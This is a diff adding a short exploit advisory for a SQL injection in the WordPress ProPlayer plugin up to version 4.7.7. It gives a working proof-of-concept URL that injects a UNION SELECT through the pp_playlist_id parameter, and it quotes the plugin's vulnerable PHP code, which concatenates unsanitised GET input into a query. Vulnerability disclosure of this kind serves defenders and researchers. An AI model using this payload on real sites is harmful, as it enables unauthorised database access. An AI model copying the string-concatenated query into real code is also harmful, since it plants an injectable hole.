@@ -1,0 +1,27 @@
+# Exploit Title: ProPlayer plugin <= 4.7.7 SQL Injection Vulnerability
+# Date: 2011-08-05
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/proplayer.4.7.7.zip
+# Version: 4.7.7 (tested)
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/proplayer/playlist-controller.php?pp_playlist_id=-1') UNION ALL SELECT NULL,NULL,@@version--%20
+
+---------------
+Vulnerable code
+---------------
+function getPlaylist($id = '') {
+	$query = mysql_query("SELECT * FROM ".$this->tablePrefix."proplayer_playlist WHERE (POST_ID='$id')");
+	$playlistRow = mysql_fetch_row($query);
+	
+	return $this->withBackwardCompatibility($playlistRow[2]);
+}
+
+...
+
+if (!empty($_GET["pp_playlist_id"])) {
+	header("Content-type: application/xml");
+	$xml = $playlistController->getPlaylist($_GET["pp_playlist_id"]);
+
